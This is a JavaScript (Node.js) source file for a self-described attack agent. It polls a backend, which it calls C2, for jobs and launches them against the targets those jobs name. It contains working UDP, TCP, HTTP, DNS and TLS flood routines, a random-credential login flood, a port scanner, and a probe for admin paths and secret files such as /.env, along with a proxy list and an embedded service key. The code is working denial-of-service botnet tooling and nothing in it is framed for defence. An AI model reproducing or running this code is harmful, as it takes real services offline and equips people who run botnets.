/**
 * SECURITYFORGE AGENT V15.1 (RESTORED)
 * - V13 Core: Dynamic Memory Scaling
 * - V14 Shadow Ops: DNS Reaper, Admin Hunter
 * - V15 Fortress: Login Siege, SSL Storm, Port Scanner (NEW)
 */
const https = require('https');
const http = require('http');
const http2 = require('http2');
const net = require('net');
const dgram = require('dgram');
const zlib = require('zlib');
const tls = require('tls');
const dns = require('dns');

// --- CONFIG ---
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";

// --- ASSETS ---
const PROXY_LIST = [
    '104.16.148.244:80', '188.166.204.43:8080', '45.167.124.5:999', '103.152.112.162:80',
    '117.251.103.186:8080', '43.205.118.158:80', '167.172.109.12:3128', '20.210.113.32:8123'
];
const ADMIN_PATHS = ['/admin', '/login', '/wp-admin', '/dashboard', '/.env', '/config.php', '/backup.sql', '/api/v1/users', '/root', '/panel'];
const TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 5432, 6379, 8080, 8443];
const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');  

// --- KEEPALIVE SERVER ---
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V15.1 ACTIVE'); })
    .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));

// --- HELPER: NATIVE SUPABASE ---
const supabaseRequest = (method, pathStr, body = null) => {
    return new Promise((resolve, reject) => {
        try {
            const baseUrl = new URL(SUPABASE_URL);
            const apiPath = '/rest/v1' + (pathStr.startsWith('/') ? pathStr : '/' + pathStr);
            const options = {
                hostname: baseUrl.hostname,
                path: apiPath,
                method: method,
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=representation'
                }
            };
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => { 
                    if (res.statusCode >= 400) {
                        if (res.statusCode === 400) console.log('\x1b[33m[DB ERROR] Schema Mismatch. Run DB Repair Tool.\x1b[0m');
                        resolve(null);
                    } else {
                        try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); } 
                    }
                });
            });
            req.on('error', (e) => reject(e));
            if (body) req.write(JSON.stringify(body));
            req.end();
        } catch(e) { reject(e); }
    });
};

console.log('\x1b[35m[AGENT] Initialized V15.1 (Restored). Polling C2...\x1b[0m');

let activeJob = null;
let activeLoop = null;

// --- DYNAMIC SCALING (AUTO-MEM) ---
const MAX_RAM_BYTES = 400 * 1024 * 1024; 
const checkMemory = () => {
    const used = process.memoryUsage().heapUsed;
    return used < MAX_RAM_BYTES;
};

const startAttack = (job) => {
    if (activeJob) return;
    activeJob = job;
    const duration = (job.duration && job.duration > 0) ? job.duration : 30;
    console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | Target: ${job.concurrency} | D: ${duration}s\x1b[0m`);
    
    let running = true;
    let totalRequests = 0;
    let jobSuccess = 0;
    let jobFailed = 0;
    let jobLatencySum = 0;
    let jobReqsForLatency = 0;
    let jobMaxLatency = 0;
    
    // --- MODULE: SHADOW OPS & RECON ---
    if (job.use_dns_reaper) {
        // DNS Reaper
        const [host, portStr] = job.target.split(':');
        const port = 53;
        const flood = () => {
             if (!running) return;
             if (!checkMemory()) return setTimeout(flood, 100);
             try {
                const client = dgram.createSocket('udp4');
                const buf = Buffer.from('aa00010000010000000000000377777706676f6f676c6503636f6d0000010001', 'hex'); 
                client.send(buf, port, host, (err) => { client.close(); totalRequests++; });
             } catch(e) {}
             if (running) setImmediate(flood);
        };
        for(let i=0; i<Math.min(job.concurrency, 300); i++) flood();
    }
    else if (job.use_admin_hunter) {
        // Admin Hunter
        let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
        const scan = (pathIndex) => {
            if (!running) return;
            const path = ADMIN_PATHS[pathIndex % ADMIN_PATHS.length];
            const opts = { hostname: targetUrl.hostname, path: path, method: 'HEAD', timeout: 3000 };
            const req = https.request(opts, (res) => {
                if (res.statusCode === 200) console.log(`\x1b[32m[VULN] Found: ${targetUrl.hostname}${path}\x1b[0m`);
                totalRequests++;
                if (running) setImmediate(() => scan(pathIndex + 1));
            });
            req.on('error', () => { if(running) setImmediate(() => scan(pathIndex + 1)); });
            req.end();
        };
        for(let i=0; i<20; i++) scan(i);
    }
    else if (job.use_port_scan) {
        // TCP Port Scanner (V15.1)
        let targetHost = job.target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];
        const scanPort = (idx) => {
            if (!running) return;
            const port = TOP_PORTS[idx % TOP_PORTS.length];
            const socket = new net.Socket();
            socket.setTimeout(200);
            socket.on('connect', () => {
                console.log(`\x1b[32m[OPEN] Port ${port} is OPEN on ${targetHost}\x1b[0m`);
                jobSuccess++; totalRequests++; socket.destroy();
            });
            socket.on('timeout', () => { socket.destroy(); totalRequests++; });
            socket.on('error', () => { totalRequests++; });
            socket.connect(port, targetHost);
            
            if (running) setTimeout(() => scanPort(idx + 1), 50);
        }
        for(let i=0; i<50; i++) scanPort(i);
    }
    
    // --- MODULE: FORTRESS BREAKER ---
    else if (job.use_ssl_storm) {
        let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
        const host = targetUrl.hostname;
        const storm = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(storm, 100);
            try {
                const socket = tls.connect(443, host, { rejectUnauthorized: false }, () => {
                     socket.destroy();
                     jobSuccess++; totalRequests++;
                });
                socket.on('error', () => { jobFailed++; totalRequests++; });
            } catch(e) {}
            if (running) setImmediate(storm);
        };
        for(let i=0; i<Math.min(job.concurrency, 400); i++) storm();
    }
    // --- MODULE: NETJAM ---
    else if (job.method === 'UDP' || job.method === 'TCP') {
        const [host, portStr] = job.target.split(':');
        const port = parseInt(portStr) || 80;
        const flood = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(flood, 100); 
            try {
                if (job.method === 'UDP') {
                    const client = dgram.createSocket('udp4');
                    client.send(JUNK_DATA_SMALL, port, host, (err) => {
                        client.close();
                        if (!err) jobSuccess++; else jobFailed++;
                        totalRequests++;
                    });
                } else {
                    const client = new net.Socket();
                    client.connect(port, host, () => { client.write(JUNK_DATA_SMALL); client.destroy(); jobSuccess++; totalRequests++; });
                    client.on('error', () => { jobFailed++; totalRequests++; });
                }
            } catch(e) {}
            if (running) setImmediate(flood);
        };
        for(let i=0; i<Math.min(job.concurrency, 500); i++) flood(); 
    } 
    // --- MODULE: STRESSFORGE ---
    else {
        let targetUrl;
        try { targetUrl = new URL(job.target); } catch(e) { return; }
        const agent = new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity });

        const performRequest = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(performRequest, 100); 

            const lib = targetUrl.protocol === 'https:' ? https : http;
            const start = Date.now();
            
            // Login Siege Logic
            let body = job.body;
            let method = job.method || 'GET';
            if (job.use_login_siege) {
                method = 'POST';
                body = JSON.stringify({ user: Math.random().toString(36), pass: Math.random().toString(36) });
            }

            const req = lib.request(targetUrl, { agent, method, headers: {'User-Agent': 'SecurityForge/15'} }, (res) => {
                 const lat = Date.now() - start;
                 jobLatencySum += lat; jobReqsForLatency++; jobMaxLatency = Math.max(jobMaxLatency, lat);
                 if (res.statusCode < 500) jobSuccess++; else jobFailed++;
                 res.resume();
                 totalRequests++;
                 if(running) setImmediate(performRequest);
            });
            if (body) req.write(body);
            req.on('error', () => { jobFailed++; totalRequests++; if(running) setImmediate(performRequest); });
            req.end();
        };

        const spawnLoop = setInterval(() => {
             if (!running) return clearInterval(spawnLoop);
             if (checkMemory() && (totalRequests / ((Date.now() - startTime)/1000) < job.concurrency)) {
                 performRequest();
             }
        }, 50);
        for(let i=0; i<100; i++) performRequest();
    }

    // Reporting Loop
    const startTime = Date.now();
    activeLoop = setInterval(async () => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = Math.floor(totalRequests / elapsed) || 0;
        const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
        
        const statsPayload = { current_rps: rps, total_success: jobSuccess, total_failed: jobFailed, avg_latency: avgLat, max_latency: jobMaxLatency };
        try { await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, statsPayload); } catch(e) {}

        if (duration > 0 && elapsed >= duration) {
            running = false;
            clearInterval(activeLoop);
            activeJob = null;
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'COMPLETED' });
        }
    }, 2000);
};

setInterval(async () => {
    if (activeJob) return;
    try {
        const jobs = await supabaseRequest('GET', '/jobs?status=in.(PENDING,RUNNING)&limit=1');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            if (job.status === 'PENDING') await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startAttack(job);
        }
    } catch (e) { }
}, 3000);
